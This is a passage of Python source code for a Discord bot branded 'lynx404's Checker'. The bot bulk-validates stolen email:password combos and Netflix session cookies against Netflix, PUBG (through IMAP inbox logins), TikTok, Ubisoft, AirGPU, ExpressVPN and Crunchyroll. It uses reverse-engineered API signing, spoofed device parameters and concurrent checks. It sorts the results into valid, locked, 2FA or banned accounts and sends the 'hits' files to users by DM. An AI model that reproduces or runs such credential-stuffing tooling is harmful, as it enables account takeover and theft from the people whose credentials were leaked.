                out[fn] = struct.unpack_from('<Q', raw, p)[0]; p += 8
            else:
                break
        return out
    @staticmethod
    def _bron_rsa(pw, mod, exp):
        mod_bytes = bytes.fromhex(mod)
        n = int.from_bytes(mod_bytes, 'big')
        e = int(exp, 16)
        pw_bytes = pw.encode()
        k = len(mod_bytes)
        fill = k - len(pw_bytes) - 3
        pad = bytes(random.randint(1, 255) for _ in range(fill))
        block = b'\x00\x02' + pad + b'\x00' + pw_bytes
        m = int.from_bytes(block, 'big')
        c = pow(m, e, n)
        return base64.b64encode(c.to_bytes(k, 'big')).decode()
    @staticmethod
    def _brn_mp(k, v):
        return (f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                f"Content-Disposition: form-data; name=\"{k}\"\r\n\r\n"
                f"{v}\r\n"
                f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n").encode()

# ===================================================================
#  NETFLIX CHECKER
# ===================================================================
class NetflixChecker:
    @staticmethod
    def parse_cookie(cookie_text):
        cookies = {}
        for line in cookie_text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
            elif '=' in line:
                k, v = line.split('=', 1)
                cookies[k.strip()] = v.strip()
        return cookies
    
    @staticmethod
    def check(cookie_text):
        cookies = NetflixChecker.parse_cookie(cookie_text)
        if not any(k in cookies for k in ['secureNetflixId', 'NetflixId', 'SecureNetflixId']):
            return {'valid': False, 'status': 'BAD', 'reason': 'Missing essential cookies'}
        session = requests.Session()
        for k, v in cookies.items():
            session.cookies.set(k, v, domain=".netflix.com")
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            r = session.get("https://www.netflix.com/browse", headers=headers, timeout=15, allow_redirects=False)
            if r.status_code == 200:
                if '"profileName"' in r.text:
                    profile_name = re.search(r'"profileName":"([^"]+)"', r.text)
                    email = re.search(r'"email":"([^"]+)"', r.text)
                    return {'valid': True, 'status': 'FULL_VALID', 'profile': profile_name.group(1) if profile_name else 'Unknown',
                            'email': email.group(1) if email else 'Unknown'}
            if 'login' in r.url or r.status_code in (401, 403):
                return {'valid': False, 'status': 'BAD', 'reason': 'Expired/Invalid'}
            return {'valid': False, 'status': 'ERROR', 'reason': f'HTTP {r.status_code}'}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  PUBG CHECKER
# ===================================================================
class PUBGChecker:
    PUBG_SENDERS = ["noreply@pubgmobile.com", "service@pubgmobile.com"]
    
    @staticmethod
    def get_imap_server(domain):
        domain_lower = domain.lower()
        custom = {'hotmail.com': 'imap-mail.outlook.com', 'outlook.com': 'imap-mail.outlook.com',
                  'live.com': 'imap-mail.outlook.com', 'gmail.com': 'imap.gmail.com',
                  'yahoo.com': 'imap.mail.yahoo.com'}
        for key, server in custom.items():
            if key in domain_lower:
                return server
        return f'imap.{domain_lower}'
    
    @staticmethod
    def check(email, password):
        try:
            domain = email.split('@')[1].lower()
            imap_server = PUBGChecker.get_imap_server(domain)
            import imaplib
            imap = imaplib.IMAP4_SSL(imap_server, timeout=10)
            imap.login(email, password)
            status, messages = imap.select('INBOX')
            if status != 'OK':
                return {'valid': False, 'status': 'ERROR', 'reason': 'Cannot select INBOX'}
            has_pubg = False
            for sender in PUBGChecker.PUBG_SENDERS:
                status, search_results = imap.search(None, 'FROM', sender)
                if status == 'OK' and search_results[0]:
                    email_ids = search_results[0].split()
                    if email_ids:
                        has_pubg = True
                        break
            imap.close(); imap.logout()
            if has_pubg:
                return {'valid': True, 'status': 'FULL_VALID', 'message': 'PUBG emails found'}
            else:
                return {'valid': False, 'status': 'NO_PUBG', 'reason': 'No PUBG emails found'}
        except imaplib.IMAP4.error as e:
            if 'Authentication failed' in str(e) or 'Invalid credentials' in str(e):
                return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
            if 'Too many' in str(e) or 'locked' in str(e).lower():
                return {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account locked'}
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  TIKTOK CHECKER
# ===================================================================
class TikTokChecker:
    @staticmethod
    def check(email, password):
        session = requests.Session()
        secret = ''.join(random.choices('0123456789abcdef', k=32))
        session.cookies.update({"passport_csrf_token": secret, "passport_csrf_token_default": secret})
        device_id = str(random.randint(10**18, 10**19 - 1))
        openudid = binascii.hexlify(os.urandom(8)).decode()
        cdid = str(uuid.uuid4())
        iid = str(random.randint(10**18, 10**19 - 1))
        params = {
            'passport-sdk-version': "6031490", 'device_platform': "android", 'os': "android",
            'ssmix': "a", '_rticket': str(int(time.time()*1000)), 'cdid': cdid,
            'channel': "googleplay", 'aid': "1233", 'app_name': "musical_ly",
            'version_code': "370104", 'version_name': "37.8.5", 'manifest_version_code': "2023701040",
            'update_version_code': "2023701040", 'ab_version': "37.8.5", 'resolution': "720*1448",
            'dpi': "420", 'device_type': "SM-S928B", 'device_brand': "samsung", 'language': "en",
            'os_api': "28", 'os_version': "11", 'ac': "wifi", 'is_pad': "0", 'current_region': "US",
            'app_type': "normal", 'sys_region': "US", 'last_install_time': str(int(time.time())-86400),
            'mcc_mnc': "41840", 'timezone_name': "Asia/Baghdad", 'carrier_region_v2': "418",
            'residence': "US", 'app_language': "en", 'carrier_region': "US", 'timezone_offset': "10800",
            'host_abi': "arm64-v8a", 'locale': "en", 'ac2': "wifi", 'uoo': "0", 'op_region': "US",
            'build_number': "37.8.5", 'region': "US", 'ts': str(int(time.time()*1000)), 'iid': iid,
            'device_id': device_id, 'openudid': openudid, 'support_webview': "1", 'reg_store_region': "us",
            'user_selected_region': "0", 'cronet_version': "f6248591_2024-09-11",
            'ttnet_version': "4.2.195.9-tiktok", 'use_store_region_cookie': "1"
        }
        payload = {'email': email}
        headers = {'User-Agent': 'com.zhiliaoapp.musically/370104 (Linux; U; Android 11; en_US; SM-S928B; Build/UP1A.231005.007; Cronet/131.0.6778.248 2024-12-01; QuicVersion/17.0.0.0 2024-12-01)',
                   'x-tt-passport-csrf-token': secret, 'Accept': 'application/json, text/plain, */*',
                   'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/",
                                    params=params, data=payload, headers=headers, timeout=15)
            if response.status_code == 200:
                data = response.json()
                code = data.get('code')
                if code == 0 and data.get('data', {}).get('uid'):
                    return {'valid': True, 'status': 'FULL_VALID', 'uid': data['data']['uid']}
                elif code == 1023:
                    return {'valid': False, 'status': '2FA', 'reason': '🔐 Need verification'}
                elif code == 1001:
                    return {'valid': False, 'status': 'BANNED', 'reason': '🚫 Banned'}
                elif code == 429:
                    return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
                else:
                    return {'valid': False, 'status': 'ERROR', 'reason': f'Code {code}'}
            elif response.status_code == 429:
                return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
            else:
                return {'valid': False, 'status': 'ERROR', 'reason': f'HTTP {response.status_code}'}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  UBISOFT CHECKER
# ===================================================================
class UbisoftChecker:
    @staticmethod
    def check(email, password):
        session = requests.Session()
        auth_b64 = base64.b64encode(f"{email}:{password}".encode()).decode()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'authorization': f'Basic {auth_b64}',
            'Content-Type': 'application/json',
            'ubi-appid': '314d4fef-e568-454a-ae06-43e3bece12a6',
            'Origin': 'https://connect.ubisoft.com',
            'Referer': 'https://connect.ubisoft.com/'
        }
        try:
            r = session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions",
                             json={"rememberMe": True}, headers=headers, timeout=15)
            if r.status_code == 401:
                if 'locked' in r.text.lower() or 'too many' in r.text.lower():
                    return {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account locked'}
                return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
            if r.status_code == 429:
                return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
            if r.status_code != 200:
                return {'valid': False, 'status': 'ERROR', 'reason': f'HTTP {r.status_code}'}
            data = r.json()
            if 'twoFactorAuthenticationTicket' in str(data):
                return {'valid': False, 'status': '2FA', 'reason': '🔐 2FA required'}
            profile_id = data.get('profileId')
            ticket = data.get('ticket')
            if not profile_id or not ticket:
                return {'valid': False, 'status': 'ERROR', 'reason': 'No session'}
            headers2 = {'Authorization': f'ubi_v1 t={ticket}', 'ubi-sessionid': profile_id,
                        'ubi-appid': '2c2d31af-4ee4-4049-85dc-00dc74aef88f',
                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15'}
            r2 = session.get("https://public-ubiservices.ubi.com/v3/users/me", headers=headers2, timeout=15)
            if r2.status_code == 200:
                user_data = r2.json()
                return {'valid': True, 'status': 'FULL_VALID', 'username': user_data.get('username', 'Unknown'),
                        'country': user_data.get('country', 'Unknown')}
            return {'valid': False, 'status': 'ERROR', 'reason': 'Failed to get user info'}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  AIRGPU CHECKER
# ===================================================================
class AirGPUChecker:
    @staticmethod
    def check(email, password):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
            "Origin": "https://app.airgpu.com",
            "Referer": "https://app.airgpu.com/"
        }
        payload = {
            "AuthFlow": "USER_PASSWORD_AUTH",
            "ClientId": "2gdu68fihh410sp7553b6ovm5n",
            "AuthParameters": {"USERNAME": email, "PASSWORD": password},
            "ClientMetadata": {}
        }
        try:
            r = requests.post("https://cognito-idp.eu-central-1.amazonaws.com/", json=payload, headers=headers, timeout=15)
            if r.status_code == 400:
                error_data = r.json()
                if 'InvalidParameterException' in str(error_data) or 'UserNotFoundException' in str(error_data):
                    return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
                if 'NotAuthorizedException' in str(error_data):
                    return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
                if 'TooManyRequestsException' in str(error_data):
                    return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
            if r.status_code != 200:
                return {'valid': False, 'status': 'ERROR', 'reason': f'HTTP {r.status_code}'}
            data = r.json()
            if "AuthenticationResult" not in data:
                return {'valid': False, 'status': 'ERROR', 'reason': 'No auth result'}
            auth = data["AuthenticationResult"]
            access_token = auth.get("AccessToken")
            id_token = auth.get("IdToken")
            if not access_token or not id_token:
                return {'valid': False, 'status': 'ERROR', 'reason': 'Missing tokens'}
            parts = id_token.split('.')
            if len(parts) < 2:
                return {'valid': False, 'status': 'ERROR', 'reason': 'Invalid token'}
            payload = parts[1]
            rem = len(payload) % 4
            if rem:
                payload += "=" * (4 - rem)
            try:
                jwt = json.loads(base64.urlsafe_b64decode(payload))
                account_id = jwt.get("custom:account") or jwt.get("sub")
            except:
                account_id = None
            if not account_id:
                return {'valid': False, 'status': 'ERROR', 'reason': 'No account id'}
            headers2 = {"Authorization": f"Bearer {access_token}", "User-Agent": "Mozilla/5.0"}
            r2 = requests.get(f"https://api.airgpu.com/accounts/{account_id}", headers=headers2, timeout=15)
            if r2.status_code == 200:
                data2 = r2.json()
                credit = data2.get('credit') or data2.get('balance') or 0
                return {'valid': True, 'status': 'FULL_VALID', 'credit': credit}
            return {'valid': False, 'status': 'ERROR', 'reason': 'Failed to fetch account'}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  EXPRESSVPN CHECKER
# ===================================================================
class ExpressVPNChecker:
    @staticmethod
    def check(email, password):
        try:
            cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
            hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
            crypto = AesCryptographyService()
            iv = CryptoHelper.get_byte_array(16)
            key = CryptoHelper.get_byte_array(16)
            base64_iv = base64.b64encode(iv).decode('ascii')
            base64_key = base64.b64encode(key).decode('ascii')
            install_id = ''.join(random.choices('0123456789abcdef', k=64))
            post_data = json.dumps({"email": email, "iv": base64_iv, "key": base64_key, "password": password})
            gzipped = CryptoHelper.gzip_data(post_data)
            encrypted_post = CryptoHelper.envelope_encrypt(gzipped, cert_base64)
            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), hmac_key.encode('ascii'))
            post_signature = CryptoHelper.compute_signature(encrypted_post, hmac_key.encode('ascii'))
            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                'Expect': '',
                'Content-Type': 'application/octet-stream',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {header_signature} 91c776e',
                'X-Body-Signature': f'2 {post_signature} 91c776e',
                'Accept-Language': 'en',
                'Accept-Encoding': 'gzip, deflate'
            }
            session = requests.Session()
            r = session.post(url, data=encrypted_post, headers=headers, timeout=15, verify=False)
            if r.status_code != 200:
                if r.status_code == 401:
                    return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
                if r.status_code == 429:
                    return {'valid': False, 'status': 'RATE_LIMITED', 'reason': '⏱️ Rate limited'}
                return {'valid': False, 'status': 'ERROR', 'reason': f'HTTP {r.status_code}'}
            decrypted = crypto.decrypt(r.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
            response_body = decrypted.decode('utf-8', errors='ignore')
            access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
            ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
            ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
            return {'valid': True, 'status': 'FULL_VALID', 'access_token': access_token, 'ovpn_user': ovpn_user, 'ovpn_pass': ovpn_pass}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  CRUNCHYROLL CHECKER
# ===================================================================
class CrunchyrollChecker:
    @staticmethod
    def check(email, password):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })
        try:
            r = session.get('https://www.crunchyroll.com/', timeout=10)
            csrf_token = None
            match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
            if match:
                csrf_token = match.group(1)
            
            if not csrf_token:
                r = session.get('https://www.crunchyroll.com/api/v2/auth/token', timeout=10)
                csrf_token = session.cookies.get('csrf_token')
            
            login_data = {
                'username': email,
                'password': password,
                'csrf_token': csrf_token or ''
            }
            r = session.post('https://www.crunchyroll.com/login', data=login_data, allow_redirects=True, timeout=15)
            
            if 'profile' in r.url or 'account' in r.url:
                r2 = session.get('https://www.crunchyroll.com/api/v2/account', timeout=10)
                if r2.status_code == 200:
                    data = r2.json()
                    return {
                        'valid': True,
                        'status': 'FULL_VALID',
                        'username': data.get('username', 'Unknown'),
                        'plan': data.get('plan', 'Free'),
                        'country': data.get('country', 'Unknown'),
                        'verified': '✅' if data.get('verified_email') else '❌'
                    }
                return {'valid': True, 'status': 'FULL_VALID', 'message': 'Logged in successfully'}
            
            if 'locked' in r.text.lower() or 'too many' in r.text.lower():
                return {'valid': False, 'status': 'LOCKED', 'reason': '🔒 Account locked'}
            if '2fa' in r.text.lower() or 'two-factor' in r.text.lower():
                return {'valid': False, 'status': '2FA', 'reason': '🔐 2FA required'}
            if 'invalid' in r.text.lower() or 'incorrect' in r.text.lower():
                return {'valid': False, 'status': 'BAD', 'reason': '❌ Invalid credentials'}
            
            return {'valid': False, 'status': 'BAD', 'reason': 'Invalid credentials'}
        except Exception as e:
            return {'valid': False, 'status': 'ERROR', 'reason': str(e)}

# ===================================================================
#  DISCORD UI – lynx404'S CHECKER
# ===================================================================

# ---- COLORS ----
COLORS = {
    "primary": 0x5865F2,
    "success": 0x57F287,
    "danger": 0xED4245,
    "warning": 0xFEE75C,
    "info": 0xEB459E,
    "xbox": 0x107C10,
    "gradient_start": 0x6C2C9F,
    "gradient_end": 0xEB459E,
}

# ---- ROLE CHECKER FUNCTIONS ----
def has_required_role(interaction: discord.Interaction) -> bool:
    if interaction.user.id == OWNER_ID:
        return True
    member = interaction.guild.get_member(interaction.user.id)
    if not member:
        return False
    for role in member.roles:
        if role.name == ALLOWED_ROLE_NAME:
            return True
    return False

def role_required():
    async def predicate(interaction: discord.Interaction):
        # Check channel restriction
        if not is_allowed_channel(interaction.channel_id):
            embed = discord.Embed(
                title="⛔ Channel Not Allowed",
                description=f"This bot is restricted to a specific channel. Please use it in the designated channel.",
                color=0xED4245
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return False
        if has_required_role(interaction):
            return True
        embed = discord.Embed(
            title="❌ Access Denied",
            description=f"You need the **{ALLOWED_ROLE_NAME}** role to use this command.",
            color=0xED4245
        )
        embed.add_field(name="🔑 How to get access", value=f"Ask an admin to assign you the `{ALLOWED_ROLE_NAME}` role.", inline=False)
        embed.set_footer(text="lynx404's Checker • Role Required")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return False
    return app_commands.check(predicate)

# ---- BOT ----
class lynx404Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)
        self.synced = False
        self.start_time = datetime.now()

    async def setup_hook(self):
        await self.tree.sync()
        self.synced = True
        print("✅ Slash commands synced.")

    async def on_ready(self):
        load_config()
        print(f'✅ Logged in as {self.user} (ID: {self.user.id})')
        print(f'🌐 Guilds: {len(self.guilds)}')
        print(f'🔒 Required Role: {ALLOWED_ROLE_NAME}')
        print(f'📌 Allowed Channel: {ALLOWED_CHANNEL_ID if ALLOWED_CHANNEL_ID else "None (all channels)"}')
        await self.change_presence(activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="lynx404's Checker"
        ))

bot = lynx404Bot()

# ---- Pending bulk states ----
pending_bulk: Dict[int, Tuple[str, Any, bool, discord.Interaction]] = {}

# ---- Helper: parse combos ----
def parse_combos(text: str) -> List[Tuple[str, str]]:
    lines = text.splitlines()
    entries = []
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        user, passwd = line.split(':', 1)
        entries.append((user.strip(), passwd.strip()))
    return entries

# ---- Helper: send DM or fallback ----
async def send_dm_or_ephemeral(interaction: discord.Interaction, embed: discord.Embed, files: list = None):
    """Attempt to send a DM; if fails, send ephemeral in channel."""
    try:
        if files:
            await interaction.user.send(embed=embed, files=files)
        else:
            await interaction.user.send(embed=embed)
        return True
    except discord.Forbidden:
        # Fallback to ephemeral
        if files:
            await interaction.followup.send(embed=embed, files=files, ephemeral=True)
        else:
            await interaction.followup.send(embed=embed, ephemeral=True)
        return False

# ---- Helper: process bulk ----
async def process_bulk(interaction: discord.Interaction, service_name: str, checker_func, entries: List[Tuple[str, str]], is_cookie: bool = False):
    total = len(entries)
    if total == 0:
        embed = discord.Embed(title="❌ No valid entries", color=0xff0000)
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    prog_embed = discord.Embed(
        title=f"🔍 Bulk Check – {service_name}",
        description=f"Processing **{total}** entries...",
        color=COLORS["primary"]
    )
    prog_embed.add_field(name="Progress", value="0% (0/{})".format(total), inline=False)
    prog_msg = await interaction.followup.send(embed=prog_embed, ephemeral=True)

    sem = asyncio.Semaphore(10)
    valid_count = 0
    invalid_count = 0
    result_lines = []
    hit_lines = []

    async def run_check(index, entry):
        nonlocal valid_count, invalid_count
        async with sem:
            if is_cookie:
                original = entry[0] if isinstance(entry, tuple) else entry
                result = await asyncio.to_thread(checker_func, original)
            else:
                user, passwd = entry
                original = f"{user}:{passwd}"
                result = await asyncio.to_thread(checker_func, user, passwd)

            status = result.get('status', 'UNKNOWN')
            is_valid = result.get('valid', False)
            
            if is_valid:
                valid_count += 1
                status_str = "✅ VALID"
                hit_line = f"{original} | {status}"
                if 'gamertag' in result:
                    hit_line += f" | Gamertag: {result.get('gamertag')} | Tier: {result.get('tier')}"
                elif 'steamid' in result:
                    hit_line += f" | SteamID: {result.get('steamid')}"
                elif 'roblox_username' in result:
                    hit_line += f" | Roblox: {result.get('roblox_username')}"
                elif 'profile' in result and isinstance(result['profile'], dict):
                    hit_line += f" | {', '.join(f'{k}:{v}' for k,v in result['profile'].items() if v)}"
                elif 'uid' in result:
                    hit_line += f" | UID: {result.get('uid')}"
                elif 'credit' in result:
                    hit_line += f" | Credit: {result.get('credit')}"
                hit_lines.append(hit_line)
            else:
                invalid_count += 1
                status_str = f"❌ {status}"

            line = f"{original} | {status_str}"
            reason = result.get('reason', '')
            if reason:
                line += f" | {reason}"
            result_lines.append(line)

            if (index+1) % 3 == 0 or index+1 == total:
                pct = int((index+1)/total*100)
                embed = discord.Embed(
                    title=f"🔍 Bulk Check – {service_name}",
                    description=f"Processing **{total}** entries...",
                    color=COLORS["primary"]
                )
                embed.add_field(name="Progress", value=f"{pct}% ({index+1}/{total})", inline=False)
                embed.add_field(name="✅ Valid", value=str(valid_count), inline=True)
                embed.add_field(name="❌ Invalid", value=str(invalid_count), inline=True)
                await prog_msg.edit(embed=embed)
            return result

    tasks = [run_check(i, entry) for i, entry in enumerate(entries)]
    await asyncio.gather(*tasks)

    header = f"lynx404's Checker – {service_name} Results\n"
    header += f"Checked at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
    header += f"Total: {total} | Valid: {valid_count} | Invalid: {invalid_count}\n"
    header += "="*60 + "\n"
    
    full_results = header + "\n".join(result_lines)
    file_obj = discord.File(io.BytesIO(full_results.encode('utf-8')), filename="Results.txt")
    
    if hit_lines:
        hits_header = f"lynx404's Checker – {service_name} HITS\n"
        hits_header += f"Total Hits: {len(hit_lines)}\n"
        hits_header += "="*60 + "\n"
        hits_content = hits_header + "\n".join(hit_lines)
        hits_file = discord.File(io.BytesIO(hits_content.encode('utf-8')), filename="Hits.txt")
    else:
        hits_file = None

    final_embed = discord.Embed(
        title=f"✅ Bulk Check Completed – {service_name}",
        description=f"Total: **{total}**  |  ✅ Valid: **{valid_count}**  |  ❌ Invalid: **{invalid_count}**",
        color=0x00ff00 if valid_count > 0 else 0xff0000
    )
    final_embed.set_footer(text="👻lynx404t's Checker • Full details in attached file")

    # Send results via DM
    files_to_send = [file_obj]
    if hits_file:
        files_to_send.append(hits_file)
    await send_dm_or_ephemeral(interaction, final_embed, files_to_send)

    # Update progress message
    done_embed = discord.Embed(title="✅ Bulk Check Completed", description="**Results have been sent to your DMs.**", color=0x00ff00)
    await prog_msg.edit(embed=done_embed)

# ---- Modals ----
class BaseModal(ui.Modal, title="Single Check"):
    def __init__(self, service_name: str, checker_func, is_cookie: bool = False):
        super().__init__(title=f"{service_name} Single Check")
        self.service_name = service_name
        self.checker_func = checker_func
        self.is_cookie = is_cookie
        if is_cookie:
            self.input = ui.TextInput(label="Cookie String", placeholder="Paste your Netflix cookie", required=True, style=discord.TextStyle.paragraph)
        else:
            self.input = ui.TextInput(label="Combo", placeholder="email:password", required=True, max_length=200)
        self.add_item(self.input)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        if self.is_cookie:
            result = await asyncio.to_thread(self.checker_func, self.input.value)
            embed = create_cool_embed(self.service_name, result, "https://cdn.discordapp.com/attachments/123456789/123456789/netflix.png")
        else:
            if ':' not in self.input.value:
                embed = discord.Embed(title="❌ Invalid format", description="Use `email:password`", color=0xff0000)
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            user, passwd = self.input.value.split(':', 1)
            result = await asyncio.to_thread(self.checker_func, user, passwd)
            if self.service_name in ["Xbox Game Pass", "Minecraft"]:
                embed = create_xbox_gamepass_embed(user, passwd, result)
            else:
                embed = create_cool_embed(self.service_name, result, "https://cdn.discordapp.com/attachments/123456789/123456789/default.png")
        # Send result via DM instead of ephemeral
        await send_dm_or_ephemeral(interaction, embed)
        # Also send a small confirmation in channel
        await interaction.followup.send("✅ Check completed! Result sent to your DMs.", ephemeral=True)

def get_modal(service_name, checker, is_cookie=False):
    class Modal(BaseModal):
        pass
    Modal.__name__ = f"{service_name}Modal"
    return Modal(service_name, checker, is_cookie)

# ---- Service Action View ----
class ServiceActionView(ui.View):
    def __init__(self, service_name: str, checker_func, is_cookie: bool = False):
        super().__init__(timeout=120)
        self.service_name = service_name
        self.checker_func = checker_func
        self.is_cookie = is_cookie

    @ui.button(label="🔍 Single Check", style=discord.ButtonStyle.primary)
    async def single_button(self, interaction: discord.Interaction, button: ui.Button):
        modal = get_modal(self.service_name, self.checker_func, self.is_cookie)
        await interaction.response.send_modal(modal)

    @ui.button(label="📤 Bulk Check (.txt)", style=discord.ButtonStyle.success)
    async def bulk_button(self, interaction: discord.Interaction, button: ui.Button):
        pending_bulk[interaction.user.id] = (self.service_name, self.checker_func, self.is_cookie, interaction)
        embed = discord.Embed(
            title=f"📤 Bulk Check – {self.service_name}",
            description="**Upload a `.txt` file** with one entry per line.\n"
                        "• For accounts: `email:password`\n"
                        "• For Netflix: one cookie per line\n\n"
                        "**Send the file in this channel** and I'll process it.\n\n"
                        "Results will be sent to your DMs.",
            color=COLORS["primary"]
        )
        await interaction.response.send_message(embed=embed, ephemeral=False)

    @ui.button(label="🔙 Back", style=discord.ButtonStyle.secondary)
    async def back_button(self, interaction: discord.Interaction, button: ui.Button):
        await show_main_menu(interaction)

# ---- Main Menu View ----
class MainMenuView(ui.View):
    def __init__(self):
        super().__init__(timeout=120)

    @ui.button(label="🎮 Xbox Game Pass", style=discord.ButtonStyle.success, row=0)
    async def xbox_button(self, interaction, button):
        await show_service_menu(interaction, "Xbox Game Pass", XboxGamePassChecker.check, is_cookie=False)

    @ui.button(label="⛏️ Minecraft", style=discord.ButtonStyle.success, row=0)
    async def minecraft_button(self, interaction, button):
        await show_service_menu(interaction, "Minecraft", XboxGamePassChecker.check, is_cookie=False)

    @ui.button(label="🕹️ Steam", style=discord.ButtonStyle.primary, row=0)
    async def steam_button(self, interaction, button):
        await show_service_menu(interaction, "Steam", SteamChecker.check, is_cookie=False)

    @ui.button(label="🎬 Netflix", style=discord.ButtonStyle.danger, row=0)
    async def netflix_button(self, interaction, button):
        await show_service_menu(interaction, "Netflix", NetflixChecker.check, is_cookie=True)

    @ui.button(label="🎮 PSN", style=discord.ButtonStyle.primary, row=1)
    async def psn_button(self, interaction, button):
        await show_service_menu(interaction, "PSN", PSNChecker.check, is_cookie=False)

    @ui.button(label="⚔️ Roblox", style=discord.ButtonStyle.secondary, row=1)
    async def roblox_button(self, interaction, button):
        await show_service_menu(interaction, "Roblox", RobloxChecker.check, is_cookie=False)

    @ui.button(label="📧 Hotmail", style=discord.ButtonStyle.blurple, row=1)
    async def hotmail_button(self, interaction, button):
        await show_service_menu(interaction, "Hotmail", HotmailChecker.check, is_cookie=False)

